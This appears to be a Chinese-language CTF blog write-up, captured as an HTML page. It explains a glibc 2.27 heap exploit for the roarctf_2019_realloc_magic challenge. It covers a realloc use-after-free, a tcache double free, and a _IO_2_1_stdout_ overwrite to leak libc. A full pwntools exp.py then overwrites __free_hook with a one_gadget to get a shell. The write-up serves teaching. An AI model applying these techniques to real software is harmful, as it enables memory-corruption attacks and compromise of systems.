@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"avavaaya.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="概述考虑以下这种情况:    可以实现任意地址分配; 程序没有提供合适的输出功能;  这时候想要实现利用就需要泄露一个地址，可以通过打_IO_2_1_stdout_来实现信息泄露:    低字节覆盖unsorted_bin中残留的main_arena指针，   例题roarctf_2019_realloc_magicattachment 程序分析程序整体的逻辑比较清晰，glibc版本2.27，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO-leak-sumup">
+<meta property="og:url" content="https://avavaaya.github.io/2022/04/20/IO-leak-sumup/index.html">
+<meta property="og:site_name" content="Welcome">
+<meta property="og:description" content="概述考虑以下这种情况:    可以实现任意地址分配; 程序没有提供合适的输出功能;  这时候想要实现利用就需要泄露一个地址，可以通过打_IO_2_1_stdout_来实现信息泄露:    低字节覆盖unsorted_bin中残留的main_arena指针，   例题roarctf_2019_realloc_magicattachment 程序分析程序整体的逻辑比较清晰，glibc版本2.27，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-20T03:45:14.000Z">
+<meta property="article:modified_time" content="2022-04-22T07:07:11.812Z">
+<meta property="article:author" content="AvavaAYA">
+<meta property="article:tag" content="glibc2.27">
+<meta property="article:tag" content="IO">
+<meta property="article:tag" content="unsorted_bin_attack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://avavaaya.github.io/2022/04/20/IO-leak-sumup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IO-leak-sumup | Welcome</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Welcome" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Welcome</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">在看吗, 在看的话就mua你一下</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/04/20/IO-leak-sumup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IO-leak-sumup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-20 11:45:14" itemprop="dateCreated datePublished" datetime="2022-04-20T11:45:14+08:00">2022-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-22 15:07:11" itemprop="dateModified" datetime="2022-04-22T15:07:11+08:00">2022-04-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>考虑以下这种情况:  </p>
+<ul>
+<li>可以实现任意地址分配;</li>
+<li>程序没有提供合适的输出功能;</li>
+</ul>
+<p>这时候想要实现利用就需要泄露一个地址，可以通过打<code>_IO_2_1_stdout_</code>来实现信息泄露:  </p>
+<ul>
+<li>低字节覆盖<code>unsorted_bin</code>中残留的<code>main_arena</code>指针，</li>
+</ul>
+<hr>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/RoarCTF-2019/realloc_magic">attachment</a></p>
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序整体的逻辑比较清晰，<code>glibc</code>版本2.27，主要问题如下:  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="built_in">get_int</span>();</span><br><span class="line">chunk_ptr = <span class="built_in">realloc</span>(chunk_ptr, size);</span><br></pre></td></tr></table></figure>
+
+<p>可以通过传入不同的<code>size</code>来控制<code>chunk_ptr</code>:   </p>
+<p><code>chunk_ptr != NULL:</code></p>
+<ul>
+<li><code>size == 0</code>:<ul>
+<li><code>free(chunk_ptr);</code></li>
+<li><strong>返回值为0</strong></li>
+</ul>
+</li>
+<li><code>size != 0</code>:<ul>
+<li><code>size == prev_sz</code>: 返回原先的ptr;</li>
+<li><code>size != prev_sz</code>: 重新分配内存，若分配失败返回值为0，<code>chunk_ptr</code>不会被改变;</li>
+</ul>
+</li>
+</ul>
+<p>因此，通过以上利用就可以实现任意地址分配.</p>
+<hr>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然程序中有<code>UAF</code>，glibc2.27的tcache也基本没什么防护，但想通过现有条件在<code>tcache</code>上打出<code>chunk_overlap</code>实现任意地址分配还是需要一些构造的:  </p>
+<p>首先，这个程序只使用一个位于<code>.bss</code>段上的指针来寻址堆块，构造堆块重叠的思路一般是:  </p>
+<ul>
+<li>先分配一个<code>chunk0</code></li>
+<li><code>realloc(0)</code>清空指针，再分配一个<code>chunk1</code>( 大于<code>chunk0</code>免得重新把<code>chunk0</code>拿出来 )</li>
+<li>多次<code>free(chunk1)</code>造成<code>double free</code>，在<code>realloc(0)</code>清空指针</li>
+<li>把<code>chunk0</code>重新分配出来，接着<code>realloc()</code>扩充<code>chunk0</code></li>
+<li>接下来再往<code>chunk0</code>上写入数据就能改到<code>chunk1</code>的<code>fd</code>指针了，同时<code>chunk1</code>现在是在<code>tcache_bins</code>中的</li>
+</ul>
+<p>如此就实现了任意地址写.</p>
+<p>但是这里我们没有<code>libc_base</code>地址，不过考虑到:  </p>
+<ul>
+<li><p><code>unsorted_bins</code>中第一个堆块的<code>fd</code>和<code>bk</code>指针会指向<code>main_arena+96</code>的地址</p>
+</li>
+<li><p><code>libc_base</code>的后12个比特位总是0，覆盖<code>fd</code>时可以直接去覆盖<code>main_arena+96</code>的后12位，再加以爆破4位就可以分配到<code>_IO_2_1_stdout</code>上进行进一步利用:  </p>
+<ul>
+<li>例如覆盖<code>fd</code>低16位为:  <code>p16( (0x6 &lt;&lt; 0xc) + (l.symbols[&#39;_IO_2_1_stdout_&#39;] &amp; 0xfff) )</code>就有 $\frac{1}{16}$ 的概率成功，实际利用中写个循环即可.</li>
+</ul>
+</li>
+</ul>
+<p>此外，本题中若是直接通过<code>tcache_double_free</code>填满<code>tcache</code>，则该堆块在下次释放时会因为和<code>top_chunk</code>相邻而直接触发<code>top_chunk</code>的合并，无法分配进<code>unsorted_bins</code>，因此就需要借助堆块的收缩来隔开<code>freed_chunk</code>和<code>top_chunk</code>:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">freeN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reallocN</span>(<span class="params">size, content</span>):</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clearN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backD</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">clearN()</span><br><span class="line">reallocN(<span class="number">0x100</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;bbb&#x27;</span>)		<span class="comment"># 隔开topchunk和unsorted_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	freeN()</span><br><span class="line">clearN()</span><br><span class="line"></span><br><span class="line">reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">reallocN(<span class="number">0xc0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p16( (<span class="number">0x6</span> &lt;&lt; <span class="number">0xc</span>) + (l.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; <span class="number">0xfff</span>) ))</span><br><span class="line"><span class="comment"># 上一行中p64(0x51)是为了防止清空指针时把这一块又放回0xb0大小的tcache中，导致下一个chunk( _IO_2_1_stdout )无法取出</span></span><br><span class="line"></span><br><span class="line">clearN()</span><br><span class="line">reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">clearN()</span><br><span class="line"><span class="comment"># reallocN(0xa0, &#x27;&#x27;&#x27;payload&#x27;&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>如此一来，就能够改到<code>_IO_2_1_stdout</code>结构体的所有内容，但<code>payload</code>如何设置才能使程序泄露地址呢:  </p>
+<ul>
+<li>设置<code>flag = 0xfbad1887</code></li>
+<li>设置<code>_IO_read_ptr=0</code>, <code>_IO_read_end=0</code>, <code>_IO_read_base=0</code>, <code>_IO_write_base</code>的最后两位为<code>0x58</code><ul>
+<li>即: <code>payload = p64(0)*3 + p8(0x58)</code></li>
+</ul>
+</li>
+</ul>
+<p>之后当程序调用<code>puts</code>函数时，就会额外打印<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的所有内容，往往第一个输出的值是<code>_IO_file_jumps</code>的地址.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x58</span>)</span><br><span class="line">reallocN(<span class="number">0xa0</span>, payload)</span><br><span class="line">leak = uu64(rn(<span class="number">6</span>))</span><br><span class="line"><span class="keyword">if</span> leak &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span>:</span><br><span class="line">	<span class="keyword">raise</span> Exception(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_addr = leak - <span class="number">0x3e82a0</span></span><br><span class="line">one_gadget= libc_addr + <span class="number">0x4f3c2</span></span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>此时<code>chunk_ptr</code>指在<code>_IO_2_1_stdout</code>结构体上，考虑调用题目提供的辅助函数清空<code>chunk_ptr</code>，然后直接打<code>free_hook</code>即可.</p>
+<hr>
+<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote_service = &quot;&quot;</span></span><br><span class="line"><span class="comment"># remote_service = remote_service.strip().split(&quot; &quot;)</span></span><br><span class="line"><span class="comment"># p = remote(remote_service[0], int(remote_service[1]))</span></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">e = ELF(filename, checksec=<span class="literal">False</span>)</span><br><span class="line">l = ELF(e.libc.path, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span> : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span> : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span> : gdb.attach(p, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debugPID</span>():</span><br><span class="line">    lg(<span class="string">&quot;p.pid&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">freeN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reallocN</span>(<span class="params">size, content</span>):</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clearN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ba</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	p = process(filename)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x100</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">			freeN()</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		reallocN(<span class="number">0xc0</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p16((<span class="number">0x6</span> &lt;&lt; <span class="number">0xc</span>) + (l.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; <span class="number">0xfff</span>)))</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		payload = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+ p8(<span class="number">0x58</span>)</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, payload)</span><br><span class="line">		leak = uu64(rn(<span class="number">6</span>))</span><br><span class="line">		<span class="keyword">if</span> leak &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span>:</span><br><span class="line">			<span class="keyword">raise</span> Exception(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">		lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">		libc_addr = leak - <span class="number">0x3e82a0</span></span><br><span class="line">		one_gadget= libc_addr + <span class="number">0x4f3c2</span></span><br><span class="line">		lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">		ba()</span><br><span class="line">		payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(libc_addr + l.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">		reallocN(<span class="number">0xd0</span>, payload)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x40</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x40</span>, p64(one_gadget))</span><br><span class="line">		freeN()</span><br><span class="line"></span><br><span class="line">		debugPID()</span><br><span class="line">		irt()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(e)</span><br><span class="line">		<span class="comment"># debugPID()</span></span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/glibc2-27/" rel="tag"># glibc2.27</a>
+              <a href="/tags/IO/" rel="tag"># IO</a>
+              <a href="/tags/unsorted-bin-attack/" rel="tag"># unsorted_bin_attack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/15/HackPack-2022-cerebrum-boggled-writeup/" rel="prev" title="HackPack-2022-cerebrum-boggled-writeup">
+      <i class="fa fa-chevron-left"></i> HackPack-2022-cerebrum-boggled-writeup
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
